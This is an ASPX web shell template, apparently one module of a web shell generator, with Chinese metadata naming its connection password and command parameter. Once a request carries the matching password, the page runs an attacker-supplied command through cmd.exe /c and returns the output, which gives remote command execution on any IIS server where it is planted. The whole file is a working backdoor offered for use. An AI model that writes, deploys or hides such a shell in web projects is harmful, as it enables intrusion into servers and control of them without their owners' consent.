<%-- MODULE = {"name": "aspx_basic", "desc": "ASPX 命令执行:C# Process cmd.exe /c 回显", "category": "aspx", "params": [["pass", "连接密码"], ["cmd_param", "命令参数名,默认 cmd"]]} --%>
<%@ Page Language="C#" %>
<%
if (Request["pass"] == "{{pass}}") {
    try {
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request["{{cmd_param}}"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write(p.StandardOutput.ReadToEnd());
    } catch (Exception e) { Response.Write(e.ToString()); }
}
%>
